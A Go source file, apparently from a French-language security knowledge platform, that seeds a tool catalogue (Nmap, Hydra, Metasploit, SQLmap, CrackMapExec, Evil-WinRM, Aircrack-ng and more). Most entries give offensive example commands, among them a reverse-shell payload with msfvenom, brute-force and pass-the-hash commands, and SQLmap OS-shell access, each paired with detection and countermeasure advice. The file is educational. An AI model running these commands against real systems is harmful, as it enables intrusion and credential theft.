package store

import (
	"strings"

	"github.com/cyber-hub/cyber-hub/internal/models"
)

// ListTools retourne les outils avec filtres et pagination optionnels.
// Si page=0 ou limit=0, retourne tous les résultats (comportement legacy).
func ListTools(category, subCategory, os, search string, page, limit int) ([]models.Tool, int64, error) {
	query := DB.Model(&models.Tool{})

	if category != "" {
		query = query.Where("category = ?", category)
	}
	if subCategory != "" {
		query = query.Where("sub_category = ?", subCategory)
	}
	if os != "" {
		query = query.Where("os = ? OR os = 'both'", os)
	}
	if search != "" {
		term := "%" + strings.ToLower(search) + "%"
		query = query.Where(
			"LOWER(name) LIKE ? OR LOWER(description) LIKE ? OR LOWER(tags) LIKE ?",
			term, term, term,
		)
	}

	var total int64
	query.Count(&total)

	query = query.Order("name ASC")
	if page > 0 && limit > 0 {
		query = query.Offset((page - 1) * limit).Limit(limit)
	}

	var tools []models.Tool
	err := query.Find(&tools).Error
	return tools, total, err
}

// GetToolByID retourne un outil par son ID
func GetToolByID(id uint) (*models.Tool, error) {
	var tool models.Tool
	err := DB.First(&tool, id).Error
	return &tool, err
}

// CreateTool crée un nouvel outil
func CreateTool(req *models.ToolCreateRequest) (*models.Tool, error) {
	level := req.EthicalLevel
	if level == "" {
		level = models.EthicalStandard
	}
	tool := models.Tool{
		Name:            req.Name,
		Category:        req.Category,
		SubCategory:     req.SubCategory,
		OS:              req.OS,
		Description:     req.Description,
		Install:         req.Install,
		Usage:           req.Usage,
		Examples:        req.Examples,
		Defense:         req.Defense,
		Procedure:       req.Procedure,
		EthicalLevel:    level,
		LegalNotes:      req.LegalNotes,
		EthicalUseCases: req.EthicalUseCases,
		CommandTemplate: req.CommandTemplate,
		InputSchema:     req.InputSchema,
		UserNotes:       req.UserNotes,
		Tags:            req.Tags,
	}
	err := DB.Create(&tool).Error
	return &tool, err
}

// UpdateTool met à jour un outil existant
func UpdateTool(id uint, req *models.ToolCreateRequest) (*models.Tool, error) {
	tool, err := GetToolByID(id)
	if err != nil {
		return nil, err
	}

	level := req.EthicalLevel
	if level == "" {
		level = models.EthicalStandard
	}
	tool.Name = req.Name
	tool.Category = req.Category
	tool.SubCategory = req.SubCategory
	tool.OS = req.OS
	tool.Description = req.Description
	tool.Install = req.Install
	tool.Usage = req.Usage
	tool.Examples = req.Examples
	tool.Defense = req.Defense
	tool.Procedure = req.Procedure
	tool.EthicalLevel = level
	tool.LegalNotes = req.LegalNotes
	tool.EthicalUseCases = req.EthicalUseCases
	tool.CommandTemplate = req.CommandTemplate
	tool.InputSchema = req.InputSchema
	tool.UserNotes = req.UserNotes
	tool.Tags = req.Tags

	err = DB.Save(tool).Error
	return tool, err
}

// DeleteTool supprime un outil par son ID
func DeleteTool(id uint) error {
	return DB.Delete(&models.Tool{}, id).Error
}

// GetSubCategories retourne la liste distincte des sous-catégories
func GetSubCategories() ([]string, error) {
	var results []string
	err := DB.Model(&models.Tool{}).
		Distinct("sub_category").
		Pluck("sub_category", &results).Error
	return results, err
}

// GetStats retourne des statistiques rapides pour le dashboard
func GetStats() (map[string]int64, error) {
	var total, offensive, defensive int64
	var ctfTotal, ctfCompleted int64
	var cveTotal, cveCritical int64
	var playbooksTotal int64

	DB.Model(&models.Tool{}).Count(&total)
	DB.Model(&models.Tool{}).Where("category = ?", "offensive").Count(&offensive)
	DB.Model(&models.Tool{}).Where("category = ?", "defensive").Count(&defensive)

	DB.Model(&models.CTFWriteup{}).Count(&ctfTotal)
	DB.Model(&models.CTFWriteup{}).Where("completed = ?", true).Count(&ctfCompleted)

	DB.Model(&models.CVEEntry{}).Count(&cveTotal)
	DB.Model(&models.CVEEntry{}).Where("severity = ?", "critical").Count(&cveCritical)

	DB.Model(&models.Playbook{}).Count(&playbooksTotal)

	return map[string]int64{
		"tools_total":     total,
		"offensive":       offensive,
		"defensive":       defensive,
		"ctf_total":       ctfTotal,
		"ctf_completed":   ctfCompleted,
		"cve_total":       cveTotal,
		"cve_critical":    cveCritical,
		"playbooks_total": playbooksTotal,
	}, nil
}

// SeedTools insère ou met à jour les outils de référence.
// Utilise un upsert par nom : les nouveaux outils sont ajoutés sans toucher aux existants.
func SeedTools() error {
	seeds := []models.ToolCreateRequest{
		{
			Name: "Nmap", Category: "offensive", SubCategory: "network",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "scan,réseau,recon,ports",
			Description: "Scanner de ports et d'hôtes réseau. Outil incontournable pour la reconnaissance réseau et l'audit de sécurité.",
			Install:     "**Windows** : Télécharger l'installeur sur https://nmap.org/download.html\n\n**Linux (Debian/Ubuntu)** :\n```bash\nsudo apt install nmap\n```",
			Usage:       "```bash\n# Syntaxe de base\nnmap [options] <cible>\n\n# Options principales\n-sV    # Détection de version des services\n-sC    # Scripts NSE par défaut\n-O     # Détection d'OS\n-p-    # Scanner tous les ports (1-65535)\n-A     # Scan agressif (-sV -sC -O --traceroute)\n-T4    # Timing agressif (plus rapide)\n--open # Afficher uniquement les ports ouverts\n```",
			Examples:    "```bash\n# Scan rapide des ports courants\nnmap -T4 192.168.1.1\n\n# Scan complet avec détection de service\nnmap -sV -sC -p- -T4 192.168.1.1\n\n# Découverte d'hôtes sur un réseau\nnmap -sn 192.168.1.0/24\n\n# Scan furtif SYN\nnmap -sS -T2 192.168.1.1\n\n# Export XML pour exploitation\nnmap -oX scan.xml -A 192.168.1.1\n```",
			Defense:     "**Détection** :\n- Les scans Nmap génèrent un grand nombre de connexions en peu de temps → IDS/IPS (Snort, Suricata) les détectent facilement\n- Logs firewall : connexions TCP SYN sans ACK sur de nombreux ports\n\n**Contre-mesures** :\n- Activer un IDS/IPS avec règles anti-scan\n- Limiter le taux de connexions entrantes (iptables `-m limit`)\n- Port knocking pour les services sensibles\n- Désactiver les services inutiles",
		},
		{
			Name: "Hydra", Category: "offensive", SubCategory: "brute-force",
			EthicalLevel: models.EthicalWarning,
			OS:           "both", Tags: "brute-force,mot-de-passe,authentification",
			Description: "Outil de brute force multi-protocoles (SSH, FTP, HTTP, RDP, SMB...). Très rapide grâce au parallélisme.",
			Install:     "**Linux** :\n```bash\nsudo apt install hydra\n```\n\n**Windows** : Utiliser depuis WSL2 ou Kali Linux",
			Usage:       "```bash\n# Syntaxe\nhydra -l <user> -P <wordlist> <protocole>://<cible>\n\n# Options clés\n-l  <login>    # login unique\n-L  <fichier>  # liste de logins\n-p  <pass>     # mot de passe unique\n-P  <fichier>  # wordlist\n-t  <n>        # threads parallèles (défaut: 16)\n-s  <port>     # port personnalisé\n-V             # mode verbose (affiche chaque tentative)\n```",
			Examples:    "```bash\n# Brute force SSH\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10\n\n# Brute force HTTP Basic Auth\nhydra -l admin -P passwords.txt http-get://192.168.1.10/admin\n\n# Brute force formulaire web (HTTP POST)\nhydra -l admin -P passwords.txt 192.168.1.10 http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"\n\n# Brute force RDP\nhydra -l administrator -P passwords.txt rdp://192.168.1.10\n```",
			Defense:     "**Détection** :\n- Multiples échecs d'authentification rapides dans les logs\n- fail2ban détecte et bannit automatiquement\n\n**Contre-mesures** :\n- Activer fail2ban (SSH, HTTP...)\n- Limiter les tentatives de connexion (account lockout)\n- Authentification par clé SSH (désactiver password auth)\n- 2FA sur tous les services exposés\n- Changer les ports par défaut",
		},
		{
			Name: "Wireshark", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "capture,réseau,analyse,trafic,paquets",
			Description: "Analyseur de protocoles réseau. Capture et analyse le trafic en temps réel ou depuis des fichiers PCAP.",
			Install:     "**Windows/Linux** : https://www.wireshark.org/download.html\n\n```bash\n# Linux\nsudo apt install wireshark\nsudo usermod -aG wireshark $USER\n```",
			Usage:       "**Interface graphique** : Sélectionner une interface → Start Capture\n\n**Filtres de capture (BPF)** :\n```\ntcp port 80          # Trafic HTTP\nhost 192.168.1.1     # Trafic vers/depuis une IP\nnot arp              # Exclure ARP\n```\n\n**Filtres d'affichage** :\n```\nhttp                 # Paquets HTTP\nip.addr == 10.0.0.1  # IP spécifique\ntcp.flags.syn == 1   # Paquets SYN\ndns                  # Requêtes DNS\n```",
			Examples:    "```bash\n# CLI (tshark) - capturer 100 paquets HTTP\ntshark -i eth0 -c 100 -Y http\n\n# Capturer vers un fichier PCAP\ntshark -i eth0 -w capture.pcap\n\n# Lire un fichier PCAP et filtrer\ntshark -r capture.pcap -Y \"http.request.method == POST\"\n\n# Extraire les credentials HTTP Basic\ntshark -r capture.pcap -Y http -T fields -e http.authorization\n```",
			Defense:     "",
		},
		{
			Name: "Metasploit Framework", Category: "offensive", SubCategory: "exploitation",
			EthicalLevel: models.EthicalWarning,
			OS:           "linux", Tags: "exploitation,payload,meterpreter,post-exploitation",
			Description: "Framework d'exploitation le plus utilisé en pentest. Contient des milliers d'exploits, payloads et modules auxiliaires.",
			Install:     "**Linux (Kali)** : Pré-installé\n\n**Linux (autre)** :\n```bash\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall\nchmod 755 msfinstall && ./msfinstall\n```",
			Usage:       "```bash\n# Lancer la console\nmsfconsole\n\n# Commandes de base dans msfconsole\nsearch <terme>      # Chercher un exploit/module\nuse <module>        # Charger un module\ninfo                # Infos sur le module chargé\nshow options        # Afficher les options\nset <OPT> <val>     # Configurer une option\nrun / exploit       # Lancer l'exploit\nsessions -l         # Lister les sessions actives\nsessions -i <id>    # Interagir avec une session\n```",
			Examples:    "```bash\n# Scan de vulnérabilités SMB (EternalBlue check)\nuse auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS 192.168.1.0/24\nrun\n\n# Générer un payload (msfvenom)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe\n\n# Listener pour recevoir le payload\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.1\nset LPORT 4444\nrun\n```",
			Defense:     "**Détection** :\n- Signatures connues détectées par la plupart des AV/EDR\n- Trafic Meterpreter détectable par IDS (patterns spécifiques)\n- Logs d'erreurs applicatives lors d'exploitation\n\n**Contre-mesures** :\n- Patcher régulièrement les systèmes (WSUS, apt)\n- EDR sur tous les endpoints (Wazuh, Defender ATP)\n- Segmentation réseau (limiter les mouvements latéraux)\n- Monitoring des connexions sortantes anormales",
		},
		{
			Name: "Gobuster", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "fuzzing,web,répertoires,brute-force,enumération",
			Description: "Outil de brute force pour la découverte de répertoires, fichiers et sous-domaines web. Très rapide (Go concurrent).",
			Install:     "```bash\n# Linux\nsudo apt install gobuster\n\n# Ou depuis les binaires Go\ngo install github.com/OJ/gobuster/v3@latest\n```",
			Usage:       "```bash\ngobuster dir -u <URL> -w <wordlist> [options]\n\n# Options dir\n-u   URL cible\n-w   wordlist\n-x   extensions (php,html,txt)\n-t   threads (défaut 10)\n-s   codes HTTP à afficher (200,301...)\n-b   codes à blacklister\n\n# Mode DNS (sous-domaines)\ngobuster dns -d <domaine> -w <wordlist>\n```",
			Examples:    "```bash\n# Enumération de répertoires basique\ngobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt\n\n# Avec extensions et plus de threads\ngobuster dir -u http://10.10.10.1 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,txt -t 50\n\n# Découverte de sous-domaines\ngobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Avec authentification HTTP Basic\ngobuster dir -u http://10.10.10.1/admin -w wordlist.txt -U admin -P password\n```",
			Defense:     "**Détection** :\n- Pics de requêtes HTTP 404 en très peu de temps\n- User-Agent générique (gobuster/3.x)\n- IDS/WAF détectent les patterns de fuzzing\n\n**Contre-mesures** :\n- WAF avec rate limiting\n- Bloquer les User-Agents de scanners connus\n- Analyser les logs Apache/Nginx pour détecter les rafales 404",
		},
		{
			Name: "Suricata", Category: "defensive", SubCategory: "ids-ips",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "ids,ips,réseau,détection,alertes,règles",
			Description: "IDS/IPS réseau open source haute performance. Analyse le trafic réseau en temps réel et génère des alertes basées sur des règles.",
			Install:     "```bash\n# Ubuntu/Debian\nsudo apt install suricata\n\n# Activer et démarrer\nsudo systemctl enable suricata\nsudo systemctl start suricata\n```",
			Usage:       "```bash\n# Lancer en mode IDS (lecture seule)\nsudo suricata -c /etc/suricata/suricata.yaml -i eth0\n\n# Analyser un fichier PCAP\nsudo suricata -r capture.pcap -l /var/log/suricata/\n\n# Mettre à jour les règles (Emerging Threats)\nsudo suricata-update\n```\n\n**Fichiers importants** :\n```\n/etc/suricata/suricata.yaml  # Configuration principale\n/var/log/suricata/fast.log   # Alertes rapides\n/var/log/suricata/eve.json   # Logs JSON (SIEM)\n```",
			Examples:    "```bash\n# Vérifier la configuration\nsudo suricata -T -c /etc/suricata/suricata.yaml\n\n# Tester une règle personnalisée\necho 'alert tcp any any -> any 80 (msg:\"HTTP test\"; content:\"GET\"; sid:1000001;)' >> /etc/suricata/rules/local.rules\n\n# Voir les alertes en temps réel\ntail -f /var/log/suricata/fast.log\n\n# Parser les logs JSON\njq '.event_type, .alert.signature' /var/log/suricata/eve.json\n```",
			Defense:     "",
		},
		{
			Name: "Volatility 3", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "forensics,mémoire,ram,analyse,incident",
			Description: "Framework d'analyse forensique de mémoire RAM. Extrait des artefacts (processus, connexions, malware) depuis des dumps mémoire.",
			Install:     "```bash\n# Python 3 requis\npip3 install volatility3\n\n# Ou depuis les sources\ngit clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3 && pip3 install -r requirements.txt\n```",
			Usage:       "```bash\nvol.py -f <dump.mem> <plugin> [options]\n\n# Plugins essentiels Windows\nwindows.pslist       # Liste des processus\nwindows.pstree       # Arbre des processus\nwindows.cmdline      # Lignes de commande\nwindows.netscan      # Connexions réseau\nwindows.malfind      # Injections mémoire suspectes\nwindows.filescan     # Fichiers ouverts\nwindows.hashdump     # Hashes NTLM\n```",
			Examples:    "```bash\n# Identifier le profil OS\nvol.py -f memory.dmp windows.info\n\n# Lister les processus avec PID\nvol.py -f memory.dmp windows.pslist\n\n# Détecter des injections mémoire (malware)\nvol.py -f memory.dmp windows.malfind\n\n# Voir les connexions réseau au moment du dump\nvol.py -f memory.dmp windows.netscan\n\n# Extraire des hashes NTLM\nvol.py -f memory.dmp windows.hashdump\n```",
			Defense:     "",
		},
		{
			Name: "CrackMapExec", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalWarning,
			OS:           "linux", Tags: "AD,windows,smb,authentification,lateral-movement",
			Description: "Outil de post-exploitation pour les environnements Active Directory. Enumération, authentification et mouvement latéral sur SMB/WinRM/LDAP.",
			Install:     "```bash\n# pip (recommandé)\npipx install crackmapexec\n\n# Ou depuis les sources\ngit clone https://github.com/byt3bl33d3r/CrackMapExec\ncd CrackMapExec && pip3 install .\n```",
			Usage:       "```bash\ncme <protocole> <cible> [options]\n\n# Protocoles : smb, winrm, ldap, ssh, rdp\n\n# Options communes\n-u <user>     # nom d'utilisateur\n-p <pass>     # mot de passe\n-H <hash>     # hash NTLM (pass-the-hash)\n--shares      # Lister les partages\n--sam         # Dumper SAM\n--lsa         # Dumper LSA\n-x <cmd>      # Exécuter une commande\n```",
			Examples:    "```bash\n# Découverte d'hôtes SMB\ncme smb 192.168.1.0/24\n\n# Authentification avec credentials\ncme smb 192.168.1.10 -u administrator -p 'Password123'\n\n# Pass-the-hash\ncme smb 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n\n# Lister les partages accessibles\ncme smb 192.168.1.0/24 -u user -p pass --shares\n\n# Exécuter une commande distante\ncme smb 192.168.1.10 -u admin -p pass -x 'whoami /all'\n```",
			Defense:     "**Détection** :\n- EventID 4624 (logon) + 4625 (failed logon) en masse\n- Logs SMB avec authentifications multiples sur différents hôtes\n- Honeypots AD (comptes leurres)\n\n**Contre-mesures** :\n- Désactiver SMBv1\n- LAPS (Local Administrator Password Solution)\n- Tiering AD (séparer admin de domaine, local, utilisateur)\n- Audit des connexions SMB/WinRM\n- EDR avec détection de mouvement latéral",
		},
		// ── Outils Phase 5.2 ────────────────────────────────────────────────────
		{
			Name: "SQLmap", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalWarning,
			OS:           "both", Tags: "sql-injection,web,database,automated,dump",
			Description: "Outil d'automatisation des injections SQL. Détecte et exploite automatiquement les vulnérabilités SQLi (GET/POST/cookies/headers) sur la plupart des SGBD.",
			Install:     "```bash\n# Linux\nsudo apt install sqlmap\n\n# Python (multiplateforme)\ngit clone https://github.com/sqlmapproject/sqlmap\npython3 sqlmap.py\n```",
			Usage:       "```bash\nsqlmap -u <url> [options]\n\n# Options principales\n-u <url>         # URL cible (avec paramètre ?id=1)\n--data <data>    # Données POST\n-p <param>       # Paramètre à tester\n--dbs            # Lister les bases de données\n-D <db> --tables # Lister les tables\n-D <db> -T <table> --dump  # Extraire les données\n--level=5        # Niveau de test (1-5)\n--risk=3         # Risque d'altération (1-3)\n--batch          # Mode non-interactif\n```",
			Examples:    "```bash\n# Test d'injection GET\nsqlmap -u 'http://10.10.10.1/page?id=1' --dbs\n\n# Injection POST (formulaire)\nsqlmap -u 'http://10.10.10.1/login' --data='user=a&pass=b' -p user\n\n# Extraire une table complète\nsqlmap -u 'http://10.10.10.1/page?id=1' -D webapp -T users --dump\n\n# Contournement WAF\nsqlmap -u 'http://10.10.10.1/page?id=1' --tamper=space2comment\n\n# Obtenir un shell OS\nsqlmap -u 'http://10.10.10.1/page?id=1' --os-shell\n```",
			Defense:     "**Détection** :\n- Patterns SQLi dans les logs (UNION SELECT, ' OR '1'='1)\n- WAF avec règles OWASP ModSecurity Core Rule Set\n- SIEM : alertes sur erreurs SQL répétées\n\n**Contre-mesures** :\n- Requêtes préparées (prepared statements) — jamais de concaténation SQL\n- ORM avec paramétrage automatique\n- Validation et sanitisation des entrées\n- Limiter les privilèges DB (pas de DROP en prod)",
		},
		{
			Name: "Nikto", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "web,scan,vulnérabilités,headers,cgi,ssl",
			Description: "Scanner de vulnérabilités web open source. Teste rapidement les serveurs HTTP/HTTPS pour les misconfigurations, headers manquants, fichiers dangereux et CVE connues.",
			Install:     "```bash\n# Linux\nsudo apt install nikto\n\n# Ou depuis les sources (Perl requis)\ngit clone https://github.com/sullo/nikto\ncd nikto/program && perl nikto.pl\n```",
			Usage:       "```bash\nnikto -h <cible> [options]\n\n-h <url>         # Hôte/URL cible\n-p <port>        # Port (défaut 80)\n-ssl             # Forcer HTTPS\n-o <fichier>     # Exporter rapport (-Format html|csv|xml)\n-Tuning <x>      # Types de tests (1=info, 2=misconfig...)\n-evasion <x>     # Techniques d'évasion IDS\n```",
			Examples:    "```bash\n# Scan basique\nnikto -h http://10.10.10.1\n\n# Scan HTTPS\nnikto -h https://10.10.10.1 -ssl\n\n# Port non-standard + export HTML\nnikto -h 10.10.10.1 -p 8080 -o rapport.html -Format htm\n\n# Scan avec évasion IDS\nnikto -h http://10.10.10.1 -evasion 1\n```",
			Defense:     "**Contre-mesures** :\n- WAF avec règles anti-scanner\n- Security headers : X-Frame-Options, CSP, HSTS\n- Supprimer les fichiers par défaut (readme.html, test.php...)\n- Désactiver les méthodes HTTP inutiles (TRACE, PUT, DELETE)",
		},
		{
			Name: "ffuf", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS:           "both", Tags: "fuzzing,web,répertoires,sous-domaines,paramètres,rapide",
			Description: "Fast web fuzzer écrit en Go. Extrêmement rapide pour le fuzzing de répertoires, sous-domaines, paramètres GET/POST et valeurs. Remplace souvent gobuster et wfuzz.",
			Install:     "```bash\n# Go\ngo install github.com/ffuf/ffuf/v2@latest\n\n# Linux\nsudo apt install ffuf\n\n# Binaire : https://github.com/ffuf/ffuf/releases\n```",
			Usage:       "```bash\nffuf -w <wordlist> -u <url_avec_FUZZ> [options]\n\n-w   wordlist\n-u   URL (utiliser FUZZ comme placeholder)\n-H   Header (ex: 'Host: FUZZ.domaine.com')\n-d   Data POST (ex: 'user=FUZZ&pass=test')\n-fs  Filtrer par taille de réponse (exclure)\n-fc  Filtrer par code HTTP\n-mc  Matcher par code HTTP\n-t   Threads (défaut 40)\n-e   Extensions (ex: .php,.html)\n```",
			Examples:    "```bash\n# Fuzzing de répertoires\nffuf -w /wordlists/common.txt -u http://10.10.10.1/FUZZ\n\n# Fuzzing avec extensions\nffuf -w /wordlists/common.txt -u http://10.10.10.1/FUZZ -e .php,.html,.bak\n\n# Fuzzing sous-domaines\nffuf -w /wordlists/subdomains.txt -u http://FUZZ.cible.com\n\n# Filtrer les 404 par taille\nffuf -w /wordlists/common.txt -u http://10.10.10.1/FUZZ -fs 4242\n\n# Fuzzing paramètre GET\nffuf -w /wordlists/params.txt -u 'http://10.10.10.1/page?FUZZ=test'\n```",
			Defense:     "**Détection** :\n- Rafales de requêtes 4xx en très peu de temps\n- User-Agent ffuf reconnu par les WAF\n\n**Contre-mesures** :\n- Rate limiting (nginx limit_req)\n- WAF avec détection de fuzzing\n- Retourner un code 200 générique pour les 404 (trompe ffuf)",
		},
		{
			Name: "John the Ripper", Category: "offensive", SubCategory: "password-cracking",
			EthicalLevel: models.EthicalWarning,
			OS:           "both", Tags: "crack,hash,password,md5,sha,ntlm,wordlist",
			Description: "Outil de cracking de mots de passe open source. Supporte des centaines de formats de hashes (MD5, SHA, NTLM, bcrypt, ZIP, SSH...). CPU-based, optimisé avec des règles de mutation.",
			Install:     "```bash\n# Linux\nsudo apt install john\n\n# Jumbo (plus de formats)\ngit clone https://github.com/openwall/john -b bleeding-jumbo\ncd john/src && ./configure && make\n```",
			Usage:       "```bash\njohn [options] <fichier_hash>\n\n--wordlist=<wordlist>  # Dictionnaire\n--rules                # Règles de mutation (leet, capitalisation...)\n--format=<format>      # Forcer le format (raw-md5, nt, bcrypt...)\n--show                 # Afficher les mots de passe crackés\n--incremental          # Mode brute force\n\n# Utilitaires\nssh2john id_rsa > hash    # Extraire hash d'une clé SSH\nzip2john archive.zip > hash\n```",
			Examples:    "```bash\n# Crack avec wordlist\njohn --wordlist=/wordlists/rockyou.txt hash.txt\n\n# Avec règles de mutation\njohn --wordlist=/wordlists/rockyou.txt --rules hash.txt\n\n# Forcer format MD5\njohn --format=raw-md5 --wordlist=/wordlists/rockyou.txt hash.txt\n\n# Clé SSH protégée\nssh2john id_rsa > id_rsa.hash\njohn --wordlist=/wordlists/rockyou.txt id_rsa.hash\n\n# Afficher les résultats\njohn --show hash.txt\n```",
			Defense:     "**Contre-mesures** :\n- Utiliser bcrypt ou Argon2id (pas MD5 ou SHA1 !)\n- Politique de mots de passe forts (≥12 chars, complexité)\n- Salage des hashes pour contrer les rainbow tables\n- Verrouillage après N tentatives",
		},
		{
			Name: "Aircrack-ng", Category: "offensive", SubCategory: "wifi",
			EthicalLevel: models.EthicalWarning,
			OS:           "linux", Tags: "wifi,wpa2,wep,handshake,crack,wireless",
			Description: "Suite d'audit de sécurité Wi-Fi. Capture des handshakes WPA/WPA2, craque des clés WEP, teste les réseaux sans fil. Nécessite une carte Wi-Fi en mode monitor.",
			Install:     "```bash\n# Linux\nsudo apt install aircrack-ng\n```",
			Usage:       "```bash\n# 1. Mettre la carte en mode monitor\nairmon-ng start wlan0\n\n# 2. Scanner les réseaux\nairodump-ng wlan0mon\n\n# 3. Capturer le handshake WPA2\nairodump-ng -c <canal> --bssid <MAC_AP> -w capture wlan0mon\n\n# 4. Dé-authentifier un client (force la reconnexion)\naireplay-ng -0 5 -a <MAC_AP> -c <MAC_client> wlan0mon\n\n# 5. Cracker le handshake\naircrack-ng -w /wordlists/rockyou.txt capture.cap\n```",
			Examples:    "```bash\n# Crack WEP (réseau legacy)\naircrack-ng -b <MAC_AP> capture.cap\n\n# Crack WPA2 avec wordlist\naircrack-ng -w /wordlists/rockyou.txt -b <MAC_AP> capture-01.cap\n\n# Vérifier si handshake capturé\naircrack-ng capture-01.cap\n```",
			Defense:     "**Contre-mesures** :\n- WPA3 (résistant aux attaques hors-ligne)\n- Mot de passe Wi-Fi long et aléatoire (≥20 chars)\n- Désactiver WPS (vulnérable au brute force PIN)\n- RADIUS/802.1X pour les entreprises",
		},
		{
			Name: "Evil-WinRM", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalWarning,
			OS:           "linux", Tags: "winrm,windows,AD,shell,pentest,remote",
			Description: "Client WinRM offensif pour les tests d'intrusion Active Directory. Fournit un shell PowerShell interactif, upload/download de fichiers, chargement de scripts en mémoire.",
			Install:     "```bash\n# Ruby gem\ngem install evil-winrm\n\n# Linux\nsudo apt install evil-winrm\n```",
			Usage:       "```bash\nevil-winrm -i <IP> -u <user> -p <password> [options]\nevil-winrm -i <IP> -u <user> -H <NTLM_hash>  # Pass-the-hash\n\n# Options\n-s <script_dir>  # Dossier de scripts PS\n-e <exe_dir>     # Dossier d'exécutables\n-S               # SSL\n```",
			Examples:    "```bash\n# Connexion avec credentials\nevil-winrm -i 10.10.10.1 -u administrator -p 'Password123'\n\n# Pass-the-hash\nevil-winrm -i 10.10.10.1 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n\n# Upload de fichier\n# (dans le shell evil-winrm)\nupload /local/mimikatz.exe C:\\\\Temp\\\\mimikatz.exe\n\n# Chargement de script PowerShell en mémoire\nevil-winrm -i 10.10.10.1 -u admin -p pass -s /opt/ps_scripts/\n# Puis dans le shell :\nInvoke-BloodHound\n```",
			Defense:     "**Contre-mesures** :\n- Désactiver WinRM sur les machines non-nécessaires\n- WinRM uniquement sur des réseaux de gestion dédiés\n- Logging des sessions WinRM (Event ID 169)\n- Tiering AD : pas d'accès WinRM des admins de domaine sur les postes",
		},
		{
			Name: "Enum4linux-ng", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalElevated,
			OS:           "linux", Tags: "smb,AD,enumeration,shares,users,groups,linux",
			Description: "Réécriture Python d'enum4linux pour l'énumération SMB/AD. Extrait utilisateurs, groupes, partages, politiques de mots de passe et informations OS depuis des cibles Windows/Samba.",
			Install:     "```bash\n# Linux\npip3 install enum4linux-ng\n\n# Ou depuis sources\ngit clone https://github.com/cddmp/enum4linux-ng\ncd enum4linux-ng && pip3 install -r requirements.txt\n```",
			Usage:       "```bash\nenum4linux-ng [options] <IP>\n\n-A          # Tout (recommandé)\n-u <user>   # Utilisateur\n-p <pass>   # Mot de passe\n-oY <file>  # Export YAML\n-oJ <file>  # Export JSON\n```",
			Examples:    "```bash\n# Enumération complète anonyme\nenum4linux-ng -A 10.10.10.1\n\n# Avec credentials\nenum4linux-ng -A -u admin -p Password123 10.10.10.1\n\n# Export JSON pour analyse\nenum4linux-ng -A -oJ results.json 10.10.10.1\n```",
			Defense:     "**Contre-mesures** :\n- Désactiver les sessions null SMB\n- Restreindre l'accès SMB aux adresses IP autorisées\n- Masquer les informations OS et version Samba\n- Audit régulier des partages accessibles anonymement",
		},
		{
			Name: "YARA", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS:           "both", Tags: "malware,détection,règles,forensics,threat-hunting",
			Description: "Outil de détection de malware basé sur des règles. Crée des signatures pour identifier des familles de malware, du code malveillant ou des patterns suspects dans des fichiers et processus.",
			Install:     "```bash\n# Linux\nsudo apt install yara\n\n# Python (librairie)\npip3 install yara-python\n```",
			Usage:       "```bash\nyara [options] <règles.yar> <cible>\n\n-r        # Scan récursif de répertoire\n-s        # Afficher les strings correspondantes\n-w        # Désactiver les warnings\n\n# Structure d'une règle YARA :\nrule NomRègle {\n    meta:\n        description = \"Détecte X\"\n    strings:\n        $a = \"string suspecte\"\n        $b = { 6D 61 6C 77 61 72 65 }  // hex\n    condition:\n        $a or $b\n}\n```",
			Examples:    "```bash\n# Scanner un fichier\nyara règles.yar /chemin/fichier.exe\n\n# Scan récursif d'un dossier\nyara -r règles.yar /chemin/dossier/\n\n# Utiliser les règles communautaires (YARAify)\nyara rules/malware_index.yar /tmp/suspect/\n\n# Depuis Python\nimport yara\nrules = yara.compile('règles.yar')\nmatches = rules.match('/tmp/sample.exe')\n```",
			Defense:     "",
		},
		{
			Name: "Masscan", Category: "offensive", SubCategory: "network",
			EthicalLevel: models.EthicalElevated,
			OS:           "linux", Tags: "scan,réseau,ports,rapide,async,massif",
			Description: "Scanner de ports TCP/UDP ultra-rapide (100 millions de paquets/seconde). Conçu pour scanner l'intégralité d'Internet. Même interface que Nmap mais asynchrone et beaucoup plus rapide.",
			Install:     "```bash\n# Linux\nsudo apt install masscan\n\n# Depuis les sources\ngit clone https://github.com/robertdavidgraham/masscan\ncd masscan && make\n```",
			Usage:       "```bash\n# ⚠️ Nécessite root (raw sockets)\nmasscan [options] <cible>\n\n-p <ports>          # Ports (80,443 ou 0-65535)\n--rate <n>          # Paquets/sec (défaut: 100)\n--open-only         # Afficher uniquement les ports ouverts\n-oX <fichier>       # Export XML\n--banners           # Récupérer les bannières\n```",
